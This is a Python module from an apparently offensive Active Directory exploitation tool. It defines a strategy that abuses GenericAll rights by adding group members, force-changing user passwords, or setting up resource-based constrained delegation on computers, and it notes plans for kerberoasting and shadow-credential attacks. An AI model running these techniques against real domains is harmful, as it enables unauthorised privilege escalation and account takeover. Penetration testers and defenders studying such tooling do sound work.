# strategies/generic_all.py
from dataclasses import dataclass

from .bloodyad_base import BloodyADBase
from .techniques.ldap_techniques import ADTechniquesMixin
from entities.edge_kind import EdgeKind
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from exceptions.hop_failed_error import HopFailedError

# TODO : Add _targeted_kerberoast() & _shadow_credentials_attack

@dataclass
class GenericAllStrategy(ADTechniquesMixin, BloodyADBase):
    _DISPATCH = {
        NodeKind.GROUP: ADTechniquesMixin._do_add_member,
        NodeKind.USER: ADTechniquesMixin._do_force_change_password,
        NodeKind.COMPUTER: ADTechniquesMixin._do_rbcd,
    }

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.GENERIC_ALL

    def exploit(self, creds: dict) -> ExploitResult:
        creds = self._prepare_creds(creds)

        action = self._DISPATCH.get(self.target.kind)
        if action is None:
            raise HopFailedError(
                self.edge,
                f"GenericAll on {self.target.kind.value} — no known technique yet"
            )

        return action(self, creds)